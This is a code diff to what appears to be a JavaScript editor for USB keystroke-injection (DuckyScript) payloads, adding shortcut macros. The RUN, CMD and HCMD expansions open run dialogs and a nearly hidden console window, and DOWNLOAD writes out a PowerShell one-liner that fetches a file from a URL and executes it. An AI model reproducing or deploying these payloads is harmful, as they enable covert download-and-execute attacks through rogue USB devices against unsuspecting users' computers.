@@ -386,9 +386,24 @@ var version = "9.0",
 					position = position - 4;
 				}
 				if (input.match(/(^|,)RUN/gm)) {
-					input = input.replace(/(^|,)RUN/gm, "GUI R");
+					input = input.replace(/(^|,)RUN/gm, "GUI R\nDELAY 450\nSTRING \nENTER");
 					changecursor = true;
-					position = position + 2;
+					position = position + 20;
+				}
+				if (input.match(/(^|,)HCMD/gm)) {
+					input = input.replace(/(^|,)HCMD/gm, "GUI R\nDELAY 450\nSTRING cmd /t:fe /k \"mode con: cols=21 lines=1\"\nENTER\nDELAY 600\nSTRING \nENTER");
+					changecursor = true;
+					position = position + 83;
+				}
+				if (input.match(/(^|,)CMD/gm)) {
+					input = input.replace(/(^|,)CMD/gm, "GUI R\nDELAY 450\nSTRING cmd\nENTER\nDELAY 600\nSTRING \nENTER");
+					changecursor = true;
+					position = position + 47;
+				}
+				if (input.match(/(^|,)DOWNLOAD/gm)) {
+					input = input.replace(/(^|,)DOWNLOAD/gm, "GUI R\nDELAY 450\nSTRING powershell\nENTER\nDELAY 600\nSTRING $d=New-Object System.Net.WebClient;$u='http://';$f=\"_\";$f+=Get-Random;$f+=[System.IO.Path]::GetExtension($u);$d.DownloadFile($u,$f);$e=New-Object -com shell.application;$e.shellexecute($f);exit\nENTER");
+					changecursor = true;
+					position = position + 95;
 				}
 				if (input.match(/(^|,)SLEEP/gm)) {
 					input = input.replace(/(^|,)SLEEP/gm, "DELAY");
